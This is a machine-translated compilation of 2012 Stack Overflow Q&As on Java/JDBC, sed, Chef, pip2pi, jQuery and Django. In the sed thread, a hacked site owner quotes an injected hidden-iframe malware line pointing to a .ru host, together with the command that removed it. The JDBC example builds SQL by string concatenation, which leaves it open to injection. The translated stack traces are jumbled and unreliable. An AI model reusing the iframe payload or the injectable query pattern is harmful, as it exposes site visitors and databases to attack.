            addMouseListener(new MouseAdapter() {
                @Override
                public void mouseClicked(MouseEvent e) {
                    if (mapBounds != null) {
                        boolean shouldPaint = false;
                        for (Image image : mapBounds.keySet()) {
                            Rectangle bounds = mapBounds.get(image);
                            if (bounds.contains(e.getPoint())) {
                                if (selected.contains(image)) {
                                    shouldPaint = true;
                                    selected.remove(image);
                                } else {
                                    shouldPaint = true;
                                    selected.add(image);
                                }
                                // In it's current form, there is not overlapping, if you
                                // have overlapping images, you may want to reconsider this
                                break;
                            }
                        }
                        if (shouldPaint) {
                            repaint();
                        }
                    }
                }
            });
        }

        public void addImage(Image image) {
            // You could devise some kind of algorithim to determine if was possible
            // to image the image into the existing backing buffer or not.
            // It would save having to recreate the backing buffer unless it
            // really was required...
            images.add(image);
            invalidate();
        }

        public void removeImage(Image image) {
            images.remove(image);
            if (mapBounds != null) {
                mapBounds.remove(image);
            }
            if (selected.contains(image)) {
                selected.remove(image);
            }
            invalidate();
        }

        @Override
        public Dimension getPreferredSize() {
            return new Dimension(400, 400);
        }

        protected void updateBuffer() {
            if (backingBuffer == null || backingBuffer.getWidth() != getWidth() || backingBuffer.getHeight() != getHeight()) {
                if (getWidth() > 0 && getHeight() > 0) {
                    backingBuffer = new BufferedImage(getWidth(), getHeight(), BufferedImage.TYPE_INT_ARGB);
                }
            }
            if (backingBuffer != null) {
                mapBounds = new WeakHashMap<Image, Rectangle>(images.size());
                Graphics2D g2d = backingBuffer.createGraphics();
                int y = 0;
                int x = 0;
                int rowHeight = 0;
                for (Image image : images) {
                    rowHeight = Math.max(image.getHeight(this), rowHeight);
                    if (x + image.getWidth(this) > getWidth() && x != 0) {
                        x = 0;
                        y += rowHeight;
                    }
                    mapBounds.put(image, new Rectangle(x, y, image.getWidth(this), image.getHeight(this)));
                    g2d.drawImage(image, x, y, this);
                    x += image.getWidth(this);
                    if (x > getWidth()) {
                        x = 0;
                        y += rowHeight;
                        rowHeight = 0;
                    }
                }
                g2d.dispose();
            }
        }

        @Override
        public void invalidate() {
            // This method can be called repeatly in quick sucession, rather then
            // reacting to each call, I want to delay performing the update,
            // which might be costly in time and memory until it's all settled down
            // a little...
            super.invalidate();
            updateTimer.restart();
        }

        @Override
        protected void paintComponent(Graphics g) {
            super.paintComponent(g);
            if (backingBuffer != null) {
                g.drawImage(backingBuffer, 0, 0, this);
                if (selected != null) {
                    Graphics2D g2d = (Graphics2D) g;
                    g2d.setColor(UIManager.getColor("List.selectionBackground"));
                    for (Image image : selected) {
                        Rectangle bounds = mapBounds.get(image);
                        if (bounds != null) {
                            Composite composite = g2d.getComposite();
                            g2d.setComposite(AlphaComposite.getInstance(AlphaComposite.SRC_OVER, 0.5f));
                            g2d.fill(bounds);
                            g2d.setComposite(composite);
                            g2d.draw(bounds);
                        }
                    }
                }
            }
        }
    }
} 
```

# java - JDBC ResultSet.getString Before/After Start/End of ResultSet 异常

> ID：13328708
> 
> 赞同：0
> 
> 时间：2012-11-11T04:56:07.423
> 
> 标签：java, mysql, exception, jdbc

我已经通过 Google 对这个主题进行了很多搜索，但我还没有找到有人以我使用它的方式使用 getString()，所以我无法以建议的正常方式解决这个问题。

我要做的是从数据库中获取所有信息，然后使用它来填充程序中的表模型。为此，我使用 getString 获取数据并将其放入 String[] 对象中。这是我的 MySQLConnection 类：

```
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import javax.swing.JOptionPane;
import javax.swing.table.DefaultTableModel;

public class MySQLConnect
{
    public MySQLConnect()
    {
        connect = null;
        statement = null;
        rSet = null;    
    }

    public void Connect(String dbase, String uname, String pword)
    {
        try
        {
            Class.forName("com.mysql.jdbc.Driver");

            connect = DriverManager.getConnection("jdbc:mysql://localhost/" + dbase , uname, pword);
            JOptionPane.showMessageDialog(null, "Connection successful.  Please retry your submission." , "Information", JOptionPane.INFORMATION_MESSAGE);          
        }

        catch (Exception e)
        {
            JOptionPane.showMessageDialog(null, e , "SQL Error", JOptionPane.ERROR_MESSAGE);
        }       
    }

    public void addDonor(int did, String dname, String dcname, int damount, DefaultTableModel model)
    {
        try
        {
            statement = connect.createStatement();

            statement.execute("Insert Into prg421_w5.donors Values ("+ did + ",'" + dname + "','" + dcname + "'," + damount + ")");
            JOptionPane.showMessageDialog(null, "Data entry added successfully." , "Information", JOptionPane.INFORMATION_MESSAGE);
            getRSet();
            updateTable(model);
        }

        catch (Exception e)
        {
            JOptionPane.showMessageDialog(null, e , "SQL Error", JOptionPane.ERROR_MESSAGE);
        }
    }

    public void getRSet()
    {
        try 
        {
            rSet = statement.executeQuery("Select * From donors");
        }

        catch (Exception e)
        {

        }
    }

    public void updateTable (DefaultTableModel model)
    {
        try
        {
            for (i = getRowCount(); i > 0; i--)
            {
                model.removeRow(0);
            }
        }

        catch (Exception e)
        {
            JOptionPane.showMessageDialog(null, e , "SQL Error", JOptionPane.ERROR_MESSAGE);
        }

        try
        {
            while (rSet.next())
            {
                String row[] = {rSet.getString("DonorName"),rSet.getString("DonorCharity"),((String)rSet.getString("DonationAmount"))};

                model.addRow(row);      
            }
        }

        catch (Exception e)
        {
            JOptionPane.showMessageDialog(null, e , "SQL Error", JOptionPane.ERROR_MESSAGE);
        }       
    }

    public int getRowCount()
    {
        try
        {
            rowCount = rSet.getInt(1);
        }

        catch (Exception e)
        {
            JOptionPane.showMessageDialog(null, e , "SQL Error", JOptionPane.ERROR_MESSAGE);
        }

        return rowCount;
    }   

    public Boolean isConnected()
    {
        return connect != null;
    }

    public void Close()
    {
        try
        {
          if (rSet != null)
          {
              rSet.close();
          }

          if (statement != null)
          {
              statement.close();
          }

          if (connect != null)
          {
              connect.close();
          }
        }

        catch (Exception e)
        {
            JOptionPane.showMessageDialog(null, e , "SQL Error", JOptionPane.ERROR_MESSAGE);
        }
    }

    private Connection connect;
    private Statement statement;
    private ResultSet rSet;
    private int rowCount, i;

    private static Object o = null;
} 
```

但是，我总是收到一条对话框错误消息，在标题中说明这些错误消息：

例外：在结果集开始之前

例外：结果集结束后

以下是堆栈跟踪：

> java.sql.SQLException：在 com.mysql.jdbc.SQLError.createSQLException(SQLError.java:988) 的 com.mysql.jdbc.SQLError.createSQLException(SQLError.java:1074) 开始结果集之前。 jdbc.SQLError.createSQLException(SQLError.java:974) 在 com.mysql.jdbc.SQLError.createSQLException(SQLError.java:919) 在 com.mysql.jdbc.ResultSetImpl.checkRowPos(ResultSetImpl.java:854) 在 com.mysql .jdbc.ResultSetImpl.getInt(ResultSetImpl.java:2709) 在 MySQLConnect.getRowCount(MySQLConnect.java:100) 在 MySQLConnect.updateTable(MySQLConnect.java:68) 在 MySQLConnect.addDonor(MySQLConnect.java:42) 在 Operations.addDonor (Operations.java:135) 在 GUI$EventHandler.actionPerformed(GUI.java:145) 在 javax.swing.AbstractButton.fireActionPerformed(Unknown Source) 在 javax.swing.AbstractButton$Handler。actionPerformed(Unknown Source) at javax.swing.DefaultButtonModel.fireActionPerformed(Unknown Source) at javax.swing.DefaultButtonModel.setPressed(Unknown Source) at javax.swing.plaf.basic.BasicButtonListener.mouseReleased(Unknown Source) at java.awt。 Component.processMouseEvent(Unknown Source) at javax.swing.JComponent.processMouseEvent(Unknown Source) at java.awt.Component.processEvent(Unknown Source) at java.awt.Container.processEvent(Unknown Source) at java.awt.Component。 dispatchEventImpl(Unknown Source) at java.awt.Container.dispatchEventImpl(Unknown Source) at java.awt.Component.dispatchEvent(Unknown Source) at java.awt.LightweightDispatcher.retargetMouseEvent(Unknown Source) at java.awt.LightweightDispatcher.processMouseEvent(未知来源）在 java.awt.LightweightDispatcher。dispatchEvent(Unknown Source) at java.awt.Container.dispatchEventImpl(Unknown Source) at java.awt.Window.dispatchEventImpl(Unknown Source) at java.awt.Component.dispatchEvent(Unknown Source) at java.awt.EventQueue.dispatchEventImpl( Unknown Source) at java.awt.EventQueue.access$200(Unknown Source) at java.awt.EventQueue$3.run(Unknown Source) at java.awt.EventQueue$3.run(Unknown Source) at java.security.AccessController.doPrivileged (Native Method) at java.security.ProtectionDomain$1.doIntersectionPrivilege(Unknown Source) at java.security.ProtectionDomain$1.doIntersectionPrivilege(Unknown Source) at java.awt.EventQueue$4.run(Unknown Source) at java.awt.EventQueue$4 .run(Unknown Source) at java.security.AccessController.doPrivileged(Native Method) at java.security.ProtectionDomain$1。doIntersectionPrivilege(Unknown Source) at java.awt.EventQueue.dispatchEvent(Unknown Source) at java.awt.EventDispatchThread.pumpOneEventForFilters(Unknown Source) at java.awt.EventDispatchThread.pumpEventsForFilter(Unknown Source) at java.awt.EventDispatchThread.pumpEventsForHierarchy( Unknown Source) at java.awt.EventDispatchThread.pumpEvents(Unknown Source) at java.awt.EventDispatchThread.pumpEvents(Unknown Source) at java.awt.EventDispatchThread.run(Unknown Source)java.awt.EventDispatchThread.pumpEvents(Unknown Source) at java.awt.EventDispatchThread.run(Unknown Source) 的 pumpEvents(Unknown Source)java.awt.EventDispatchThread.pumpEvents(Unknown Source) at java.awt.EventDispatchThread.run(Unknown Source) 的 pumpEvents(Unknown Source)
> 
> java.sql.SQLException：在 com.mysql.jdbc.SQLError.createSQLException(SQLError.java:988) 的 com.mysql.jdbc.SQLError.createSQLException(SQLError.java:1074) 结果集结束后。 jdbc.SQLError.createSQLException(SQLError.java:974) 在 com.mysql.jdbc.SQLError.createSQLException(SQLError.java:919) 在 com.mysql.jdbc.ResultSetImpl.checkRowPos(ResultSetImpl.java:854) 在 com.mysql .jdbc.ResultSetImpl.getInt(ResultSetImpl.java:2709) 在 MySQLConnect.getRowCount(MySQLConnect.java:100) 在 MySQLConnect.updateTable(MySQLConnect.java:68) 在 Operations.updateTable(Operations.java:164) 在 GUI$EventHandler .actionPerformed(GUI.java:148) 在 javax.swing.AbstractButton.fireActionPerformed(Unknown Source) 在 javax.swing.AbstractButton$Handler.actionPerformed(Unknown Source) 在 javax.swing。javax.swing.DefaultButtonModel.setPressed(Unknown Source) at javax.swing.plaf.basic.BasicButtonListener.mouseReleased(Unknown Source) at java.awt.Component.processMouseEvent(Unknown Source) at javax. DefaultButtonModel.fireActionPerformed(Unknown Source)。 swing.JComponent.processMouseEvent(Unknown Source) at java.awt.Component.processEvent(Unknown Source) at java.awt.Container.processEvent(Unknown Source) at java.awt.Component.dispatchEventImpl(Unknown Source) at java.awt。 Container.dispatchEventImpl(Unknown Source) at java.awt.Component.dispatchEvent(Unknown Source) at java.awt.LightweightDispatcher.retargetMouseEvent(Unknown Source) at java.awt.LightweightDispatcher.processMouseEvent(Unknown Source) at java.awt.LightweightDispatcher。 java.awt.Container 中的 dispatchEvent(Unknown Source)。dispatchEventImpl(Unknown Source) at java.awt.Window.dispatchEventImpl(Unknown Source) at java.awt.Component.dispatchEvent(Unknown Source) at java.awt.EventQueue.dispatchEventImpl(Unknown Source) at java.awt.EventQueue.access$200 （未知源）在 java.awt.EventQueue$3.run（未知源）在 java.awt.EventQueue$3.run（未知源）在 java.security.AccessController.doPrivileged(Native Method) 在 java.security.ProtectionDomain$1。 doIntersectionPrivilege(Unknown Source) at java.security.ProtectionDomain$1.doIntersectionPrivilege(Unknown Source) at java.awt.EventQueue$4.run(Unknown Source) at java.awt.EventQueue$4.run(Unknown Source) at java.security.AccessController java.security.ProtectionDomain 的 .doPrivileged(Native Method) $1.doIntersectionPrivilege(Unknown Source) 的 java.awt。EventQueue.dispatchEvent(Unknown Source) at java.awt.EventDispatchThread.pumpOneEventForFilters(Unknown Source) at java.awt.EventDispatchThread.pumpEventsForFilter(Unknown Source) at java.awt.EventDispatchThread.pumpEventsForHierarchy(Unknown Source) at java.awt.EventDispatchThread。 java.awt.EventDispatchThread.pumpEvents(Unknown Source) at java.awt.EventDispatchThread.run(Unknown Source) 的 pumpEvents(Unknown Source)EventDispatchThread.run（未知来源）EventDispatchThread.run（未知来源）

**错误实际上是从 rSet.getInt(1); 生成的。在我的 getRowCount() 方法中。**

数据仍然被添加并且一切正常，但是不得不关闭那些消息窗口只是很烦人。有人有什么建议吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-11T05:08:16.370

您需要`rSet.next()`在获取结果之前调用 getRowCount() （我什至不认为您在此代码中的任何位置创建行计数查询）。

此外，您不会在丢弃数据库资源之前关闭它们，这将导致资源泄漏。 *完成后，请始终*在 finally 块中关闭数据库资源。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T05:08:25.400

我认为您将光标定位在第一行之前，然后请求数据。您需要将光标移动到第一行。

```
 rSet.next();
 String foundType = rSet.getString(1); 
```

通常在 if 语句或循环中执行此操作。

```
if(rSet.next()){
   foundType = result.getString(1);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-11T05:09:56.707

与其将字符串作为参数传递给 ResultSet.getString("ColumnName");，不如尝试将列的编号作为 int 传递。开始计数@ 1。

```
ResultSet rs = getRSet();
if(rs != null) {
    while(rs.next()) {
        String rows[] = { rs.getString(1), rs.getString(2), rs.getString(3) };
        model.add(rows);
    }
} //else, error handling 
```

getString(int columnIndex) ：返回 String
“检索此 ResultSet 对象的当前行中指定列的值，作为 Java 编程语言中的 String。”

来源：[http ://docs.oracle.com/javase/6/docs/api/java/sql/ResultSet.html](http://docs.oracle.com/javase/6/docs/api/java/sql/ResultSet.html)

# linux-kernel - linux内核启动时如何输出pr_info()信息

> ID：13328709
> 
> 赞同：2
> 
> 时间：2012-11-11T04:56:18.967
> 
> 标签：linux-kernel, kernel

当内核启动时，消息将输出到串口。

如果`printk("Information")`被调用，串口将显示“信息”。

我想`pr_info（“”)`通过串口显示Linux内核中的所有信息。如何构建内核？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T04:24:02.100

通过“loglevel=x”或“ignore_loglevel”增加日志级别。

检查此文档以获取详细信息：http: [//www.kernel.org/doc/Documentation/kernel-parameters.txt](http://www.kernel.org/doc/Documentation/kernel-parameters.txt)

# sed - 使用 sed 删除字符串

> ID：13328710
> 
> 赞同：1
> 
> 时间：2012-11-11T04:56:41.430
> 
> 标签：sed

我被黑了，并且有数百个 .js 文件，其中包含我试图摆脱的这行代码：

```
;document.write('<iframe src="http://sitecorporatemanagement.ru/pretzellogmeins.cgi?8" scrolling="auto" frameborder="no" align="center" height="3" width="3"></iframe>'); 
```

这是文件的最后一行，但我认为该文件包含 windows 行结尾，因为每当我这样做时：

```
sed -i '/sitecorporatemanagement.ru/d' * 
```

它会删除文件的全部内容。你能帮我完成这个工作吗？我只需要删除完整的字符串。

感谢您提供的所有帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T06:56:05.043

我最终使用以下内容删除了有问题的代码，这很有效。

```
find public_html/ -type f -name "*.js" -exec sed -i 's|;document.write(\x27<iframe src="http://sitecorporatemanagement.ru/pretzellogmeins.cgi?8" scrolling="auto" frameborder="no" align="center" height="3" width="3"></iframe>\x27);||g' {} \; 
```

# chef-infra - 未从 cookbook_file 通知提供者

> ID：13328711
> 
> 赞同：1
> 
> 时间：2012-11-11T04:57:09.680
> 
> 标签：chef-infra

我正在使用 Vagrant (1.0.5) 和 chef-solo (10.12.0) 开发 ssl 提供商

我有我的提供程序，在名为 gtm_cq 的食谱中称为 ssl，我在食谱的默认食谱中将其定义为：

```
gtm_cq_ssl "author" do
    # attributes will come later
end 
```

然后我有我的 cookbook_file 如下所示，`import`一旦它将证书推送到服务器，它应该通知我的 ssl 提供者的操作：

```
cookbook_file "#{node[:cq][:ssl][:author_cert_location]}/foo.cer" do
    source "foo.cer"
    owner "crx"
    group "root"
    mode "0644"
    notifies :import, resources(:gtm_cq_ssl => "author")
end 
```

当我运行它时， foo.cer 会按预期向上推，但`import`我的 ssl 提供程序的操作永远不会被调用。我在任何参考资料中看到的最多的是日志中的这几行（删除了日志标题）：

```
.. cookbook_file[/opt/cq5/author/foo.cer] sending import action to gtm_cq_ssl[author] (delayed)
.. Processing gtm_cq_ssl[author] action import (gtm_cq::author line 34) 
```

有一个很大的非常明显的日志语句，以及使用另一个 cookbook_file 作为测试文件将某些内容推送到服务器。没有日志语句，没有推送测试文件。我也确定 foo.cer 文件在每次测试之前从服务器中删除。

我发现如果我像这样编辑我的通知行`:immediately`

```
notifies :import, resources(:gtm_cq_ssl => "author"), :immediately 
```

它似乎工作。我想这在我的特殊情况下是可以的，但如果这是我可以打电话给我的提供者的唯一方式，那似乎有些不对劲。

对此的任何帮助将不胜感激。

谢谢！

编辑：

因此，经过进一步调查，事实证明我的提供者确实被调用了，但我的提供者中的 cookbook_file 调用从未被调用。日志没有提及它。这是我的提供者：

```
action :import do

    Chef::Log.info "This is my LOG!!!!!!!!!!"
    cookbook_file "/opt/cq5/worked.dat" do
        source "worked.dat"
        cookbook "gtm_cq"
        owner "crx"
        group "root"
        mode "0644"
    end

end 
```

这是我的日志语句出现的日志，但没有关于`worked.dat`正在执行的食谱文件”

```
INFO: cookbook_file[/opt/cq5/author/nike.cer] sending import action to gtm_cq_ssl[author] (delayed)
INFO: Processing gtm_cq_ssl[author] action import (gtm_cq::author line 15)
INFO: This is my puts you PUTZ!!!!!!!!!!
INFO: template[/etc/httpd/conf/cq-farms/farm_10author.any] sending restart action to service[apache2] (delayed)
INFO: Processing service[apache2] action restart (apache2::default line 217) 
```

这是一个错误吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-30T12:48:45.033

接收到“延迟”通知（即没有 :immediately）的资源在 Chef 运行结束时执行。

`cookbook_file`我认为到那时对于像你里面的东西来说可能为时已晚：import。

你可以尝试这样的事情：

```
action :import do
    Chef::Log.info "This is my LOG!!!!!!!!!!"
    cookbook_file "/opt/cq5/worked.dat" do
        source "worked.dat"
        cookbook "gtm_cq"
        owner "crx"
        group "root"
        mode "0644"
        action :nothing      # <— add this
     end.run_action(:create) # <- change this
end 
```

这将在调用 :import 操作后立即运行该资源，而不是对其进行排队。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-27T14:09:54.713

我相信语法应该是

```
notifies :import, "gtm_cq_ssl[author]", :immediately 
```

# python - 为客户管理 Python 包的替代方法是什么？

> ID：13328712
> 
> 赞同：2
> 
> 时间：2012-11-11T04:57:10.087
> 
> 标签：python, distribution, packages

因此，设置是在一个 Linux 机器（服务器）和一组 Windows 7 工作站（客户端）上运行的大量专有服务器/客户端 Python 应用程序。在任何专有的 Python 包需要更新之前，一切都运行顺利。

现在我使用`distutils`的 Eggs 很容易用 更新`easy_install`，但它仍然是一个手动过程，随着应用程序和客户端工作站数量的增长，它很快就会变得乏味。

恕我直言，理想的设置是在服务器上安装 Python 包，因此当客户端应用程序在工作站上启动时，客户端应用程序可以检查其当前的 Python 包是否是最新的。如果没有，客户端应用程序应该从服务器下载更新的 Python 包，安装它，然后正常启动。

这听起来很熟悉吗？我自己尝试寻找替代方案，但据我所知，没有提供此功能的 Python 模块。有没有人有任何自制的解决方案？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T05:04:36.587

是的！[`pip2pi`](https://github.com/wolever/pip2pi)应该正是您正在寻找的。

从文档：

> pip2pi 从 pip 需求构建一个与 PyPI 兼容的包存储库

`pip2pi`允许您使用两个简单的命令创建自己的 PyPI 索引：

1.  要镜像包及其所有要求，请使用`pip2tgz`：

    ```
    $ cd /tmp/; mkdir package/
    $ pip2tgz packages/ httpie==0.2
    ...
    $ ls packages/
    Pygments-1.5.tar.gz
    httpie-0.2.0.tar.gz
    requests-0.14.0.tar.gz 
    ```

2.  要从上一个目录构建包索引：

    ```
    $ ls packages/
    bar-0.8.tar.gz
    baz-0.3.tar.gz
    foo-1.2.tar.gz
    $ dir2pi packages/
    $ find packages/
    /httpie-0.2.0.tar.gz
    /Pygments-1.5.tar.gz
    /requests-0.14.0.tar.gz
    /simple
    /simple/httpie
    /simple/httpie/httpie-0.2.0.tar.gz
    /simple/Pygments
    /simple/Pygments/Pygments-1.5.tar.gz
    /simple/requests
    /simple/requests/requests-0.14.0.tar.gz 
    ```

3.  要从您在步骤 2 中构建的索引安装，您可以简单地使用：

    ```
    pip install --index-url=file:///tmp/packages/simple/ httpie==0.2 
    ```

您还可以使用 .将您自己的索引镜像到远程*主机*`pip2pi`。

# javascript - Javascript，在按钮单击时增加一个计数器

> ID：13328717
> 
> 赞同：3
> 
> 时间：2012-11-11T04:58:43.790
> 
> 标签：javascript, counter, increment

在javascript中，我想制作一个计数器，当您单击按钮时会增加值。

当我第一次单击添加按钮时，数字不会增加。

但是当我将值打印到控制台时，结果会增加。

小提琴：http: [//jsfiddle.net/techydude/H63As/](http://jsfiddle.net/techydude/H63As/)

```
 $(function() {
    var //valueCount = $("counter").value(),
        counter = $("#counter"),
        addBtn = $("#add"),
        value = $("#counter").html();

      addBtn.on("click", function() {

      counter.html(value ++);  //this value is not incremented.
      console.log(value);      //this value gets incremented.
      return

    });

  });​ 
```

如何使两条线的值显示相同？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-11T05:12:05.770

### 你正在做一个后期增量。使其预增量：

```
addBtn.on("click", function() {
  counter.html(++value);
  console.log(value);
  return
}); 
```

### 解释：

```
// Increment operators
x = 1;
y = ++x;    // x is now 2, y is also 2
y = x++;    // x is now 3, y is 2

// Decrement operators
x = 3;
y = x--;    // x is now 2, y is 3
y = --x;    // x is now 1, y is also 1 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-11T05:01:24.213

你的意思是：

```
addBtn.on("click", function() {
    counter.html(++value);
    return;          
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-11T05:01:53.073

采用

```
 value = parseInt($("#counter").html()); 
```

[**现场 jSFiddle**](http://jsfiddle.net/swamimayank/T5HYu/)

```
 $(function() {
    var //valueCount = $("counter").value(),
        counter = $("#counter"),
        addBtn = $("#add"),
        value =    parseInt($("#counter").html());

    addBtn.on("click", function() {

      counter.html(++value );
      console.log(value);
      return

    });

  }); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-11T05:03:25.850

试试这个：

```
 $(function() {
    var //valueCount = $("counter").value(),
        counter = $("#counter"),
        addBtn = $("#add"),
        value = $("#counter").html();

    addBtn.on("click", function() {

      counter.html(++value);
      console.log(value);
      return

    });

  }); 
```

在这个[链接](http://www.w3schools.com/js/js_operators.asp)中查看关于 JavaScript 中 ++ 的运算符描述。

实际上只有一行发生了变化；但是，如果您想测试它，这里是提琴手[链接。](http://jsfiddle.net/H63As/17/)

# asp.net-mvc - 在 DotNetOpenAuth 中实现 IConsumerTokenManager

> ID：13328720
> 
> 赞同：2
> 
> 时间：2012-11-11T04:59:32.957
> 
> 标签：asp.net-mvc, asp.net-mvc-3, dotnetopenauth

我正在尝试在我的 ASP.NET MVC 应用程序中使用 DotNetOpenAuth 与 LinkedIn API 进行交互。要在我的数据库中保存和检索令牌，我需要在我的服务层中实现 IConsumerTokenManager。目前我正在检索访问令牌（不是请求令牌）的令牌机密，如下所示：

```
public string GetTokenSecret(string token)
{
    // Retrieves token secret from database based on the user's username
    string tokenSecret = _db.LinkedInAccounts.GetTokenSecret(HttpContext.Current.User.Identity.Name);
    return tokenSecret;
} 
```

这感觉很脏，因为我不得不在我的服务层中引用 System.Web 和 HttpContext。我真的不想这样做，但我无法确定另一种检索访问令牌的方法。我可以像这样使用访问令牌检索它：

```
string tokenSecret = _db.LinkedInAccounts.GetTokenSecret(token); 
```

但是我不确定访问令牌是否是唯一的，以及当存储了数千个访问令牌时这将如何影响数据库性能。

这是第二种方式，还是有更好的选择？我真的不想在我的服务层中引用 System.Web。

谢谢！

**更新：**如果有人遇到类似问题，我最终使用 Ninject 将用户名作为构造函数参数注入到 IConsumerTokenManager 的实现中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T04:13:07.883

您应该根据传入的令牌查找秘密。不是登录的用户名。在数据库中为该列设置的索引应该可以加快查找速度。我怀疑您当前通过用户名进行的查找无论如何都不会更快。

# jquery - 从 jQuery 调用 PageMethod 时出现未经授权的错误？

> ID：13328722
> 
> 赞同：1
> 
> 时间：2012-11-11T05:00:28.093
> 
> 标签：jquery

我正在尝试使用来自 html 页面的 jQuery 在 aspx 页面中执行 PageMethod，这在我的本地计算机上运行良好。但是，当我将网页部署到远程生产 Web 服务器时，执行 ajax 请求时会收到 401 Unauthorized Error。我的代码如下。

```
 $.ajax({
                        type: 'POST',
                        url: 'SupplierMethods.aspx/GetAgeSummaryForPendingDocuments',
                        data: "{ 'supplierId': '" + vid + "'}",
                        dataType: 'json',
                        timeout: 180000, //3 minutes is timeout for this ajax request
                        contentType: "application/json; charset=utf-8",
                        beforeSend: function () {

                        },
                        success: function (json) {
                            stats = json.d.StatsBuckets;
                         },
                        error: function (xhr, textStatus, errorThrown) {
                            alert('An error occurred! ' + (errorThrown ? errorThrown : 
                            xhr.satus));
                        }

                    });
                }); 
```

**更新：** 我的问题是由于一些非常微不足道的事情。我将网站复制到远程服务器，但忘记复制 dll。PageMethod 在 ASP.Net 网站中被编译成一个 dll，因为它丢失了，所以通过 jQuery ajax 对 PageMethod 的调用返回了一个错误消息。因此，用于 AJAX 的 jQuery API 似乎已经足够好了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T22:25:24.370

我收到此 401 错误是因为 ASP.Net 网站中包含我使用 jQuery ajax 调用的 PageMethod 的新 dll 未部署到远程服务器。**所以这个故事的寓意是 - 始终小心部署您的网站，这样您就不会错过任何文件。**

***还要确保在 jQuery 中调用 ajax 的语法符合语法。***

# ruby - 使用 Ruby 设置 Windows 壁纸

> ID：13328723
> 
> 赞同：4
> 
> 时间：2012-11-11T05:00:43.930
> 
> 标签：ruby, windows, winapi, wallpaper

我想更改 Windows 中的桌面墙纸（7，如果有区别的话）。

我在下面的尝试没有成功。据我所知，它不会更改墙纸、注册表项或执行打印“0”以外的任何操作。

```
require 'Win32API'

SPI_SETDESKWALLPAPER = 20
SPIF_UPDATEINIFILE = 0x1
SPIF_SENDWININICHANGE = 0x2

wallpaper_path = 'C:\\test.bmp'

systemParametersInfo = Win32API.new('user32', 'SystemParametersInfo', ['I','I','P','I'], 'I')
puts systemParametersInfo.call(SPI_SETDESKWALLPAPER, 0, wallpaper_path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE) 
```

2 小时的谷歌搜索并没有让我到任何地方。也许这里有人可以提供帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T06:26:42.510

我的朋友发现它可以使用不同的图像。

我使用 GIMP 保存了我的 .bmp 文件，如果您使用默认导出选项，这显然是有问题的。如果我在导出时选中“不写色彩空间信息”，它工作正常。

所以代码毕竟很好。

# php - 我如何重定向 url 保持键值

> ID：13328724
> 
> 赞同：1
> 
> 时间：2012-11-11T05:00:54.653
> 
> 标签：php, html

我有网站 (wish.com) 和 ssl 加密帐户服务器 (wish111.com)。我将 wish.com 用于广告和信息目的。我将注册和登录页面的 URL 从wish.com 重定向到wish111.com。一直以来，我都喜欢隐藏 wish111.com 的链接以供消费者使用。

但是我在消费者帐户激活链接上遇到了问题。我正在获得一起激活的链接 wish111.com/activate.php?key=c1af2cfa9aq 。我可以将激活链接的域名更改为wish.com/activate.php?key=$

如何使用键值重定向链接

# django - 模型未出现在管理页面中

> ID：13328725
> 
> 赞同：0
> 
> 时间：2012-11-11T05:01:09.377
> 
> 标签：django, django-admin

我已经多次看到这个问题，但没有人回答我的问题。
我添加了一个应用程序及其模型，但在管理门户中看不到它们。
我可以从 shell 访问模型。

**设置.py**

```
INSTALLED_APPS = (
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.sites',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    # Uncomment the next line to enable the admin:
    'django.contrib.admin',
    # Uncomment the next line to enable admin documentation:
    # 'django.contrib.admindocs',
    'myApp',
) 
```

**网址.py**

```
from django.contrib import admin
admin.autodiscover()

urlpatterns = patterns('',
    # Examples:
    # url(r'^$', 'RCOSPortal.views.home', name='home'),
    # url(r'^RCOSPortal/', include('RCOSPortal.foo.urls')),

    # Uncomment the admin/doc line below to enable admin documentation:
    # url(r'^admin/doc/', include('django.contrib.admindocs.urls')),

    # Uncomment the next line to enable the admin:
    url(r'^admin/', include(admin.site.urls)),
) 
```

**管理员.py**

```
from django.contrib import admin
from myApp.models import Owner

admin.site.register(Owner) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T05:16:15.513

*   确保您已运行“syncdb”命令。
*   创建一个 OwnerAdmin 并尝试注册它。
*   如果无法正常工作，请将您的测试项目（包括所有文件）上传到 github，以便我们为您提供帮助。

# jquery - jQuery toggle() 方法的问题

> ID：13328733
> 
> 赞同：0
> 
> 时间：2012-11-11T05:03:52.760
> 
> 标签：jquery

您能否查看以下链接并告诉我为什么 toggle() 在代码中不起作用？

[http://jsfiddle.net/GISMan/ZNkKZ/1/](http://jsfiddle.net/GISMan/ZNkKZ/1/)

这里也是代码，

```
function fluctuate(bar) {
var hgt = Math.random() * 10;
hgt += 1;
var t = hgt * 30;
bar.animate({
    height: hgt
}, t, function() {
    fluctuate($(this));
});
}
$(".bar").each(function(i) {
fluctuate($(this));
});

$("button").toggle(function(){
$(".bar").stop();},
function(){
$(".bar").fluctuate();}
); 
```

​感谢您的评论

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T05:06:47.357

**[演示](http://jsfiddle.net/ZNkKZ/2/)**-*已修复。*

改变：

```
$(".bar").fluctuate(); 
```

到：

```
fluctuate($(".bar")); 
```

# objective-c - 使用 NSWorkspace activateFileViewerSelectingURLs:atFilesDest 而不激活 finder

> ID：13328737
> 
> 赞同：1
> 
> 时间：2012-11-11T05:04:49.170
> 
> 标签：objective-c, selection, finder, nsworkspace

